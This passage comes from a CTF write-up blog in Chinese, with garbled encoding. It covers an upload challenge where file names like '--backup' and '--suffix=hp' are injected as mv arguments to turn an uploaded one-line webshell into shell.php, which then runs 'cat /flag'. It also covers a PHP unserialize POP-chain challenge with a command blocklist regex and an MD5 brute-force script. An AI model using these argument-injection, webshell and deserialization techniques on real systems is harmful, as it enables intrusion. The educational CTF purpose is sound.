ä¸´æ—¶ç›®å½•</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;files&#x27;</span>][<span class="string">&#x27;name&#x27;</span>][<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="variable">$uploadedFiles</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;files&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$uploadedFiles</span>[<span class="string">&#x27;name&#x27;</span>] <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$filename</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$uploadedFiles</span>[<span class="string">&#x27;error&#x27;</span>][<span class="variable">$index</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;æ–‡ä»¶ <span class="subst">&#123;$filename&#125;</span> ä¸Šä¼ å¤±è´¥ã€‚&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$tmpName</span> = <span class="variable">$uploadedFiles</span>[<span class="string">&#x27;tmp_name&#x27;</span>][<span class="variable">$index</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$filename</span> === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;æ–‡ä»¶åæ— æ•ˆï¼Œè·³è¿‡ã€‚&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fileParts</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$extension</span> = <span class="keyword">isset</span>(<span class="variable">$fileParts</span>[<span class="string">&#x27;extension&#x27;</span>]) ? <span class="title function_ invoke__">strtolower</span>(<span class="variable">$fileParts</span>[<span class="string">&#x27;extension&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$extension</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$extension</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>, <span class="variable">$blacklist</span>)) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;æ–‡ä»¶ <span class="subst">&#123;$filename&#125;</span> å› ç±»å‹ä¸å®‰å…¨ï¼ˆ.<span class="subst">&#123;$extension&#125;</span>ï¼‰è¢«æ‹’ç»ã€‚&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$destination</span> = <span class="variable">$uploadDir</span> . <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpName</span>, <span class="variable">$destination</span>)) &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;æ–‡ä»¶ <span class="subst">&#123;$filename&#125;</span> å·²ä¸Šä¼ è‡³ <span class="subst">$uploadDir</span><span class="subst">$filename</span> ã€‚&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;æ–‡ä»¶ <span class="subst">&#123;$filename&#125;</span> ç§»åŠ¨å¤±è´¥ã€‚&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è·å–ä¸´æ—¶ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="variable">$uploadDir</span>)) &#123;</span><br><span class="line">    <span class="variable">$handle</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$uploadDir</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$handle</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="variable">$file</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$handle</span>)) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$uploadDir</span> . <span class="variable">$file</span>)) &#123;</span><br><span class="line">                <span class="variable">$filesInTmp</span>[] = <span class="variable">$file</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">closedir</span>(<span class="variable">$handle</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¤„ç†ç¡®è®¤ä¸Šä¼ å®Œæ¯•ï¼ˆç§»åŠ¨æ–‡ä»¶ï¼‰</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;confirm_move&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$filesInTmp</span>)) &#123;</span><br><span class="line">        <span class="variable">$message</span> .= <span class="string">&quot;æ²¡æœ‰å¯ç§»åŠ¨çš„æ–‡ä»¶ã€‚&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$output</span> = [];</span><br><span class="line">        <span class="variable">$returnCode</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&quot;cd <span class="subst">$uploadDir</span> ; mv * <span class="subst">$targetDir</span> 2&gt;&amp;1&quot;</span>, <span class="variable">$output</span>, <span class="variable">$returnCode</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$returnCode</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$filesInTmp</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">                <span class="variable">$message</span> .= <span class="string">&quot;å·²ç§»åŠ¨æ–‡ä»¶: <span class="subst">&#123;$file&#125;</span> è‡³<span class="subst">$targetDir</span><span class="subst">$file</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$message</span> .= <span class="string">&quot;ç§»åŠ¨æ–‡ä»¶å¤±è´¥: &quot;</span> .<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$output</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;å¤šæ–‡ä»¶ä¸Šä¼ æœåŠ¡&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123; font-family: Arial, sans-serif; margin: <span class="number">20</span>px; &#125;</span><br><span class="line">        .container &#123; max-width: <span class="number">800</span>px; margin: auto; &#125;</span><br><span class="line">        .alert &#123; padding: <span class="number">10</span>px; margin: <span class="number">10</span>px <span class="number">0</span>; background: <span class="comment">#f8d7da; color: #721c24; border: 1px solid #f5c6cb; &#125;</span></span><br><span class="line">        .success &#123; background: <span class="comment">#d4edda; color: #155724; border-color: #c3e6cb; &#125;</span></span><br><span class="line">        ul &#123; <span class="keyword">list</span>-style-type: none; padding: <span class="number">0</span>; &#125;</span><br><span class="line">        li &#123; margin: <span class="number">5</span>px <span class="number">0</span>; padding: <span class="number">5</span>px; background: <span class="comment">#f0f0f0; &#125;</span></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;å¤šæ–‡ä»¶ä¸Šä¼ æœåŠ¡&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">if</span> ($<span class="title">message</span>): ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">alert</span> &lt;?= <span class="title">strpos</span>($<span class="title">message</span>, &#x27;å¤±è´¥&#x27;) ? &#x27;&#x27; : &#x27;<span class="title">success</span>&#x27; ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;?= $<span class="title">message</span> ?&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">files</span>&quot;&gt;é€‰æ‹©æ–‡ä»¶ï¼š&lt;/<span class="title">label</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">files</span>[]&quot; <span class="title">id</span>=&quot;<span class="title">files</span>&quot; <span class="title">multiple</span> <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload</span>&quot;&gt;ä¸Šä¼ åˆ°ä¸´æ—¶ç›®å½•&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">hr</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;<span class="title">h3</span>&gt;å¾…ç¡®è®¤ä¸Šä¼ æ–‡ä»¶&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">if</span> (<span class="title">empty</span>($<span class="title">filesInTmp</span>)): ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">p</span>&gt;æš‚æ— å¾…ç¡®è®¤ä¸Šä¼ æ–‡ä»¶&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">foreach</span> ($<span class="title">filesInTmp</span> <span class="title">as</span> $<span class="title">file</span>): ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">li</span>&gt;&lt;?= <span class="title">htmlspecialchars</span>($<span class="title">file</span>) ?&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">endforeach</span>; ?&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">confirm_move</span>&quot;&gt;ç¡®è®¤ä¸Šä¼ å®Œæ¯•ï¼Œç§»åŠ¨åˆ°å­˜å‚¨ç›®å½•&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>é»‘åå•æ¯”è¾ƒå…¨é¢ï¼ŒåŠ ä¸Šé¢˜ç›®æ ‡é¢˜æ˜¯mv_uploadï¼ŒçŒœæµ‹æœ¬é¢˜è€ƒæŸ¥ç³»ç»Ÿå‘½ä»¤<code>mv</code></p>
<p>æºç ä¸­è·Ÿmvæœ‰å…³çš„æ˜¯ ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&quot;cd <span class="subst">$uploadDir</span> ; mv * <span class="subst">$targetDir</span> 2&gt;&amp;1&quot;</span>, <span class="variable">$output</span>, <span class="variable">$returnCode</span>);</span><br></pre></td></tr></table></figure>

<p>åœ¨ç»ˆç«¯è¾“å…¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>

<p>å‡ºæ¥çš„ç¬¬ä¸€ä¸ªä½¿ç”¨æ–¹æ³•å¾ˆæœ‰æ„æ€ï¼Œæ˜¯åœ¨åé¢è·Ÿä¸Šâ€“backup</p>
<p>åŸç†æ˜¯å¦‚æœç›®æ ‡æ–‡ä»¶å·²ç»å­˜åœ¨ï¼Œå†ç”¨mvç§»åŠ¨åŒåæ–‡ä»¶ä¼šæŠŠå…ˆå‰çš„æ–‡ä»¶è¦†ç›–ï¼Œä½†æ˜¯åŠ ä¸Šâ€“backupçš„è¯ï¼Œä¸ä¼šç›´æ¥è¦†ç›–å…ˆå‰çš„æ–‡ä»¶ï¼Œè€Œæ˜¯å…ˆæŠŠæ—§æ–‡ä»¶æ”¹åå¤‡ä»½ï¼Œç„¶åå†æŠŠæ–°æ–‡ä»¶ç§»è¿‡å»ã€‚</p>
<p>ä½†æ˜¯æœ¬é¢˜å•çº¯çš„æ”¹åæ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œè¿™æ—¶å°±è¦ç”¨åˆ°å¦ä¸€ä¸ªï¼Œåœ¨åé¢è·Ÿä¸Šâ€“suffix&#x3D;ã€æƒ³è¦çš„åç¼€ã€‘ï¼Œè¿™æ ·å°±å¯ä»¥éšå¿ƒæ‰€æ¬²åœ°ä¿®æ”¹æƒ³è¦ä¸Šä¼ çš„æ–‡ä»¶åç¼€äº†</p>
<p>æœ¬é¢˜çš„æ”»å‡»é¡ºåºå¾ˆæ˜æœ—äº†</p>
<ol>
<li><p>åˆ›å»ºä¸€ä¸ªæ–‡ä»¶â€œshell.pâ€ï¼Œé‡Œé¢å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œæ¥ç€ä¸Šä¼ å¹¶ç§»åŠ¨</p>
</li>
<li><p>åˆ›å»ºæ–‡ä»¶â€œâ€“backupâ€å’Œâ€œâ€“suffix&#x3D;hpâ€ï¼Œæ¥ç€ä¸Šä¼ shell.pã€â€“backupå’Œâ€“suffix&#x3D;hpï¼ŒåŒæ—¶è¿›è¡Œç§»åŠ¨</p>
</li>
<li><p>è®¿é—®&#x2F;upload&#x2F;shell.phpï¼Œè‹¥æ˜¾ç¤ºç©ºç™½é¡µé¢å°±ä»£è¡¨æ”¹åæˆåŠŸï¼ŒPOSTä¼ å…¥cmd&#x3D;system(â€œcat &#x2F;flagâ€);å³å¯</p>
</li>
</ol>
<hr>
<h1 id="10-ezpop"><a href="#10-ezpop" class="headerlink" title="10. ezpop"></a>10. ezpop</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">begin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;var1 = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;var1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;var2;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">starlord</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;var4;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;var5-&gt;<span class="title function_ invoke__">ll2</span>(<span class="string">&#x27;b2&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">anna</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$long</span> = @<span class="variable language_">$this</span>-&gt;var6-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$long</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;var7-&gt;tt2) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;yamada yamada&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">eenndd</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$command</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i&quot;</span>, <span class="variable">$this</span>-&gt;command))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;command);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flaag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var10</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var11</span>=<span class="string">&quot;1145141919810&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;var11)) == <span class="number">666</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;var10-&gt;hey;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ISCTF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;ISCTF&quot;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>é¦–å…ˆæ‰¾ç»ˆç‚¹ï¼Œåœ¨ç±» <code>eenndd</code>ä¸­æ‰¾åˆ°<code>eval($this-&gt;command);</code>ï¼Œè¿™é‡Œå°±æ˜¯è¦åˆ°çš„ç»ˆç‚¹</p>
</li>
<li><p>æ¥ç€é€†æ¨é€šè¿‡<code>__get($arg1)</code>æ‰¾åˆ°ä¸Šä¸€æ­¥ï¼Œè§¦å‘<code>__get</code>éœ€è¦å‡ºç°ä¸€ä¸ªä¸å­˜åœ¨çš„å±æ€§ï¼Œåœ¨ç±»<code>flaag</code> ä¸­æœ‰<code>return $this-&gt;var10-&gt;hey;</code>è®¿é—®çš„å±æ€§<code>hey</code>å¹¶ä¸å­˜åœ¨</p>
</li>
<li><p>è§¦å‘ <code>__invoke</code>è¦æŠŠå¯¹è±¡å½“æˆå‡½æ•°æ¥è°ƒç”¨ï¼Œåœ¨ç±»<code>starlord</code>ä¸­æœ‰<code>return $function();</code>ï¼ŒæŠŠ<code>$function</code>å½“å‡½æ•°ç”¨</p>
</li>
<li><p>è§¦å‘ <code>__call</code>éœ€è¦è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•ï¼Œåœ¨ç±»<code>anna</code>ä¸­æœ‰<code>$long = @$this-&gt;var6-&gt;add(); return $long;</code>ï¼Œadd() æ–¹æ³•å¹¶ä¸å­˜åœ¨</p>
</li>
<li><p>è§¦å‘ <code>__toString</code>éœ€è¦æŠŠä¸€ä¸ªå¯¹è±¡å½“åšå­—ç¬¦ä¸²å¤„ç†ï¼Œåœ¨ç±»<code>begin</code>ä¸­æœ‰<code>echo $this-&gt;var1;</code></p>
</li>
<li><p><code>__destruct</code> æ˜¯ååºåˆ—åŒ–åå¯¹è±¡é”€æ¯æ—¶è‡ªåŠ¨æ‰§è¡Œï¼Œå› æ­¤ä½œä¸ºèµ·ç‚¹</p>
</li>
</ol>
<p><strong>é“¾æ¡æ€»ç»“</strong>ï¼š <code>begin::__destruct()</code> -&gt; <code>anna::__toString()</code> -&gt; <code>starlord::__call()</code> -&gt; <code>flaag::__invoke()</code> -&gt; <code>eenndd::__get()</code> -&gt; <code>eval()</code></p>
<p>å…¶ä¸­è¿˜æœ‰ä¸¤ç‚¹éœ€è¦å¤„ç†ï¼š</p>
<ol>
<li><p><code>flaag</code> ç±»çš„ MD5 å¼±ç±»å‹æ¯”è¾ƒï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;var11)) == <span class="number">666</span>)</span><br></pre></td></tr></table></figure>

<p>éœ€è¦æ‰¾ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç»è¿‡ä¸¤æ¬¡ MD5 åŠ å¯†åï¼Œç»“æœä»¥ <code>666</code> å¼€å¤´</p>
<p>ç¼–å†™ä¸€ä¸ªMD5çˆ†ç ´çš„pyè„šæœ¬ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">    s = <span class="built_in">str</span>(i) </span><br><span class="line">    res = hashlib.md5(hashlib.md5(s.encode()).hexdigest().encode()).hexdigest()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> res.startswith(<span class="string">&quot;666&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ï¼š213</p>
</li>
<li><p><code>eenndd</code> ç±»çš„æ­£åˆ™ç»•è¿‡ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|tail|more|less|php|tac|cat|sort|shell|nl|sed|awk| /i&quot;</span>, <span class="variable">$this</span>-&gt;command)</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®é»‘åå•æ„é€ payloadï¼š</p>
